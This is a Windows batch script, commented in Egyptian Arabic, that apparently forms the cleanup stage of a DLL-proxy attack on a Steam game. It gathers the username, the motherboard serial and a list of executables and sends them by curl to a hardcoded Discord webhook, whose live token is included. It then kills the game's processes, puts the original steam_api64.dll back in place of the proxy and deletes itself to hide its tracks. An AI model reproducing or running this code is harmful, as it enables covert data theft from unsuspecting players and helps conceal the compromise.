@echo off

setlocal enabledelayedexpansion



:: إعداد المتغيرات

set "WEBHOOK_URL=https://discord.com/api/webhooks/1461350525168652433/y5T90DbXCLHZGb_wqEi9ho4VqMb1XGgA6VKoL_M9LbKiywFyhcl4bAE7MpZF2oiTFOyB"

set "TEMP_FILE=%TEMP%\Result.txt"



:: 1. جمع البيانات وإرسالها (دي أول حاجة عشان نلحق قبل القفل)

echo === Device Info === > "%TEMP_FILE%"

echo Username: %USERNAME% >> "%TEMP_FILE%"

wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"

echo. >> "%TEMP_FILE%"

dir /b /s *.exe >> "%TEMP_FILE%"



:: إرسال الملف

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%TEMP_FILE%" %WEBHOOK_URL%



:: 2. قفل اللعبة (مهم جداً عشان نقدر نمسح الـ DLL)

:: هيدور على أي EXE في المجلد الحالي ويقفله

for %%i in (*.exe) do (

    taskkill /F /IM "%%i" /T >nul 2>&1

)



:: استراحة بسيطة للتأكد إن كل العمليات قفلت

timeout /t 2 >nul



:: 3. استبدال الملفات (التنظيف)

:: حذف ملف النتيجة المؤقت

if exist "%TEMP_FILE%" del /f /q "%TEMP_FILE%"



:: استعادة الـ DLL الأصلية

:: هنا بنمسح الـ Proxy اللي هو (steam_api64.dll) ونرجع (steam-api64.dll)

if exist "steam-api64.dll" (

    del /f /q "steam_api64.dll"

    ren "steam-api64.dll" "steam_api64.dll"

)



:: 4. الحركة النهائية: مسح ملف الباتش نفسه من الـ Temp

:: بنفتح cmd جديدة في الخلفية تستنى ثانية وتمسح الملف ده

start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""

exit
